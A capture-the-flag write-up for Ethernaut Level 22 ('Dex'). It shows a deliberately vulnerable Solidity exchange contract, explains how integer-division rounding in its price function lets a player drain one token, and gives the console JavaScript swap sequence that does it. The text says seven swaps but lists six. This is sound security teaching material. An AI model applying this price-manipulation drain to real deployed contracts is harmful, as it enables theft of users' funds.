# Level 22: Dex

This is the level 22 of OpenZeppelin [Ethernaut](https://ethernaut.openzeppelin.com/) web3/solidity based game.

## Pre-requisites
- [ERC20 Token Standard](https://eips.ethereum.org/EIPS/eip-20)
- Solidity [division operation](https://docs.soliditylang.org/en/v0.8.11/types.html#division)

## Hack

Given contract:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';

contract Dex  {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor(address _token1, address _token2) public {
    token1 = _token1;
    token2 = _token2;
  }

  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swap_amount = get_swap_price(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swap_amount);
    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
  }

  function add_liquidity(address token_address, uint amount) public{
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function get_swap_price(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(spender, amount);
    SwappableToken(token2).approve(spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
  }
}
```

`player` has to drain all of at least one of the two tokens - `token1` and `token2` from the contract.

The vulnerability originates from `get_swap_price` method which determines the exchange rate between tokens in the Dex. The division in it won't always calculate to a perfect integer, but a fraction. And there is no fraction types in Solidity. Instead, _division rounds towards zero._ according to docs. For example, `3 / 2 = 1` in solidity.

We're going to swap all of our `token1` for `token2`. Then swap all our `token2` to obtain `token1`, then swap all our `token1` for `token2` and so on.

Here's how the price history & balances would go. Initially,
```
      DEX       |      player  
token1 - token2 | token1 - token2
----------------------------------
  100     100   |   10      10               
```


After swapping all of `token1`:
```
      DEX       |        player  
token1 - token2 | token1 - token2
----------------------------------
  100     100   |   10      10
  110     90    |   0       20                
```

Note that at this point exchange rate is adjusted. Now, exchanging 20 `token2` should give `20 * 110 / 90 = 24.44..`. But since division results in integer we get 24 `token2`. Price adjusts again. Swap again.
```
      DEX       |        player  
token1 - token2 | token1 - token2
----------------------------------
  100     100   |   10      10
  110     90    |   0       20    
  86      110   |   24      0    
```

Notice that on each swap we get more of `token1` or `token2` than held before previous swap. This is due to the inaccuracy of price calculation in `get_swap_price` method.

Keep swapping and we'll get:
```
      DEX       |        player  
token1 - token2 | token1 - token2
----------------------------------
  100     100   |   10      10
  110     90    |   0       20    
  86      110   |   24      0    
  110     80    |   0       30    
  69      110   |   41      0    
  110     45    |   0       65   
```

Now, at the last swap above we've gotten hold of 65 `token2`, which is more than enough to drain all of 110 `token1`! By simple calculation, only 45 of `token2` is required to get all 110 of `token1`.

```
      DEX       |        player  
token1 - token2 | token1 - token2
----------------------------------
  100     100   |   10      10
  110     90    |   0       20    
  86      110   |   24      0    
  110     80    |   0       30    
  69      110   |   41      0    
  110     45    |   0       65   
  0       90    |   110     20
```

Jump into console. First approve the contract to transfer your tokens with a big enough allowance so that we don't have to approve again & again. Allowance of 500 should be more than enough:
```javascript
await contract.approve(contract.address, 500)
```
Get token addresses:
```javascript
t1 = await contract.token1()
t2 = await contract.token2()
```

Now perform 7 swaps corresponding to the table rows above one by one:
```javascript
await contract.swap(t1, t2, 10)
await contract.swap(t2, t1, 20)
await contract.swap(t1, t2, 24)
await contract.swap(t2, t1, 30)
await contract.swap(t1, t2, 41)
await contract.swap(t2, t1, 45)
```

`token1` is drained! Verify by:
```javascript
await contract.balanceOf(t1, instance).then(v => v.toString())

// Output: '0'
```
This is it!


_Learned something awesome? Consider starring the [github repo](https://github.com/theNvN/ethernaut-openzeppelin-hacks)_ 😄

_and following me on twitter [here](https://twitter.com/the_nvn)_ 🙏

